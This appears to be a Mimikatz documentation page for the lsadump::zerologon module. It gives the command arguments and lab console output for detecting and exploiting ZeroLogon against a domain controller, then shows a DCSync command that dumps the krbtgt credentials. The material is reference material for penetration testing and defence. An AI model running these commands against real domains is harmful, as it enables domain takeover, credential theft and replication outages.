# zerologon

`lsadump::zerologon` detects and exploits the [ZeroLogon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon) vulnerability. It has the following command line arguments:

* `/account`: the target DC SamAccountName
* `/target`: the target DC FQDN
* `/exploit`: proceed with exploitation
* `/null`: null session authentication
* `/ntlm`: use NTLM authentication
* `/type`: The Secure Channel Types. The available values are:
  * Null
  * MsvAp
  * Workstation
  * TrustedDnsDomain
  * TrustedDomainUasServer
  * Server
  * CdcServer

{% hint style="danger" %}
This technique can break the domain's replication services hence leading to massive disruption, running the following "password change" technique is **not advised**.
{% endhint %}

### Detection

```
mimikatz # lsadump::zerologon /target:dc.hacklab.local /account:dc$
[rpc] Remote   : dc.hacklab.local
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : dc.hacklab.local
Account: dc$
Type   : 6 (Server)
Mode   : detect

Trying to 'authenticate'...
=============================================================================================================================================================================================================================================

  NetrServerAuthenticate2: 0x00000000

* Authentication: OK -- vulnerable
```

### Exploitation

```
mimikatz # lsadump::zerologon /target:dc.hacklab.local /account:dc$ /exploit
[rpc] Remote   : dc.hacklab.local
[rpc] ProtSeq  : ncacn_ip_tcp
[rpc] AuthnSvc : NONE (0)
[rpc] NULL Sess: no

Target : dc.hacklab.local
Account: dc$
Type   : 6 (Server)
Mode   : exploit

Trying to 'authenticate'...
=============================================================================================================================================================================================================================================

  NetrServerAuthenticate2: 0x00000000
  NetrServerPasswordSet2: 0x00000000

* Authentication: OK -- vulnerable
* Set password  : OK -- may be unstable
```

A [DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) can then be conducted with [`lsadump::dcsync`](dcsync.md).

```
mimikatz # lsadump::dcsync /domain:HACKLAB.LOCAL /dc:dc.hacklab.local /user:krbtgt /authuser:dc$ /authdomain:HACKLAB /authpassword:"" /authntlm
```
